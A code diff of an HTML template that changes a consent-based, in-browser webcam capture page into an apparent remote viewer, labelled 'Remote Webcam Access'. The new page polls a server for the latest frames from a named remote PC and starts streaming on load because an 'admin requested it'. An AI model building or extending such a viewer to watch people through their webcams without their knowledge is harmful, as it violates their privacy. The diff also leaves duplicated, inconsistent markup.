@@ -39,9 +39,28 @@
             color: red;
             margin-top: 20px;
         }
+         #webcam-status {
+            margin: 10px 0;
+            padding: 10px;
+            border-radius: 5px;
+            text-align: center;
+        }
+        .status-active {
+            background-color: #33FF57;
+            color: #1e1e2f;
+        }
+        .status-inactive {
+            background-color: #FF5733;
+            color: white;
+        }
     </style>
 </head>
 <body>
+    <h1>Remote Webcam Access</h1>
+    <div id="webcam-status" class="status-inactive">Webcam Inactive</div>
+    <div id="webcam-feed">
+        <img id="webcam-image" src="" alt="Live Webcam Feed" style="width: 100%; height: auto;">
+    </div>
     <h1>Live Webcam Feed</h1>
     <div id="webcam-feed">
         <video id="video" autoplay></video>
@@ -63,134 +82,67 @@
     </div>
 
     <script>
-        const video = document.getElementById('video');
-        const capturePhotoButton = document.getElementById('capture-photo');
-        const startRecordButton = document.getElementById('start-record');
-        const stopRecordButton = document.getElementById('stop-record');
-        const photoCanvas = document.getElementById('photo-canvas');
-        const photoOutput = document.getElementById('photo-output');
-        const videoOutput = document.getElementById('video-output');
-        const errorMessage = document.getElementById('error-message');
-
-        let mediaStream;
-        let mediaRecorder;
-        let recordedChunks = [];
-
-        // Function to display error messages
-        function showError(message) {
-            errorMessage.textContent = message;
-        }
-
-        // Check if the browser supports getUserMedia
-        function isGetUserMediaSupported() {
-            return !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia);
-        }
-
-        // Access the webcam
-        async function startWebcam() {
-            if (!isGetUserMediaSupported()) {
-                showError("Your browser does not support accessing the webcam.");
-                return;
-            }
-
-            try {
-                // Request camera and microphone access
-                mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                video.srcObject = mediaStream;
-
-                // Enable buttons once the webcam is accessible
-                capturePhotoButton.disabled = false;
-                startRecordButton.disabled = false;
-                console.log("Webcam accessed successfully!");
-            } catch (error) {
-                console.error("Error accessing webcam:", error);
-                if (error.name === "NotAllowedError") {
-                    showError("Permission denied. Please allow access to your camera and microphone.");
-                } else if (error.name === "NotFoundError") {
-                    showError("No webcam found. Please ensure your device has a camera.");
-                } else {
-                    showError("Failed to access webcam. Please ensure your camera is available and permissions are granted.");
-                }
+         const userId = "{{ user_id }}";
+        const pcName = "{{ pc_name }}";
+        let isStreaming = false;
+        let refreshInterval;
+        
+        // Function to update status display
+        function updateStatus(active) {
+            const statusDiv = document.getElementById('webcam-status');
+            if (active) {
+                statusDiv.textContent = "Webcam Active - " + pcName;
+                statusDiv.className = "status-active";
+            } else {
+                statusDiv.textContent = "Webcam Inactive";
+                statusDiv.className = "status-inactive";
             }
         }
-
-        // Capture a photo
-        capturePhotoButton.addEventListener('click', () => {
-            photoCanvas.width = video.videoWidth;
-            photoCanvas.height = video.videoHeight;
-            const context = photoCanvas.getContext('2d');
-            context.drawImage(video, 0, 0, photoCanvas.width, photoCanvas.height);
-            photoOutput.src = photoCanvas.toDataURL('image/png');
-            photoOutput.style.display = 'block';
-
-            // Send the photo to the server
-            const photoData = photoCanvas.toDataURL('image/png').split(',')[1];
-            fetch(`/upload_photo/${username}`, {
-                method: 'POST',
-                body: JSON.stringify({ photo: photoData }),
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log("Photo uploaded:", data);
-            })
-            .catch(error => {
-                console.error("Error uploading photo:", error);
-            });
-        });
-
-        // Start recording
-        startRecordButton.addEventListener('click', () => {
-            recordedChunks = [];
-            mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
-            mediaRecorder.ondataavailable = (event) => {
-                if (event.data.size > 0) {
-                    recordedChunks.push(event.data);
-                }
-            };
-            mediaRecorder.onstop = () => {
-                const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                videoOutput.src = URL.createObjectURL(blob);
-                videoOutput.style.display = 'block';
-
-                // Send the video to the server
-                const formData = new FormData();
-                formData.append('video', blob, 'recorded_video.webm');
-                fetch(`/upload_video/${username}`, {
-                    method: 'POST',
-                    body: formData,
-                })
-                .then(response => response.json())
-                .then(data => {
-                    console.log("Video uploaded:", data);
-                })
-                .catch(error => {
-                    console.error("Error uploading video:", error);
-                });
-            };
-            mediaRecorder.start();
-            startRecordButton.disabled = true;
-            stopRecordButton.disabled = false;
-        });
-
-        // Stop recording
-        stopRecordButton.addEventListener('click', () => {
-            mediaRecorder.stop();
-            startRecordButton.disabled = false;
-            stopRecordButton.disabled = true;
-        });
-
-        // Release the camera when the page is closed
+        
+        // Function to start the webcam stream
+        function startStream() {
+            if (isStreaming) return;
+            
+            isStreaming = true;
+            updateStatus(true);
+            
+            // Start polling for new frames
+            refreshInterval = setInterval(() => {
+                const timestamp = new Date().getTime();
+                document.getElementById('webcam-image').src = 
+                    `/get_latest_frame/${userId}?t=${timestamp}`;
+            }, 200); // 5 FPS
+            
+            console.log("Webcam stream started");
+        }
+        
+        // Function to stop the webcam stream
+        function stopStream() {
+            if (!isStreaming) return;
+            
+            clearInterval(refreshInterval);
+            isStreaming = false;
+            updateStatus(false);
+            document.getElementById('webcam-image').src = "";
+            
+            // Notify server to stop webcam
+            fetch(`/stop_webcam/${userId}`, { method: "POST" })
+                .catch(err => console.error("Error stopping webcam:", err));
+            
+            console.log("Webcam stream stopped");
+        }
+        
+        // Initialize
+        updateStatus(false);
+        
+        // Handle beforeunload to clean up
         window.addEventListener('beforeunload', () => {
-            if (mediaStream) {
-                mediaStream.getTracks().forEach(track => track.stop());
-            }
+            stopStream();
         });
+        
+        // Start stream when page loads (admin requested it)
+        startStream();
 
-        // Start the webcam feed when the page loads
-        startWebcam();
     </script>
 </body>
 </html>
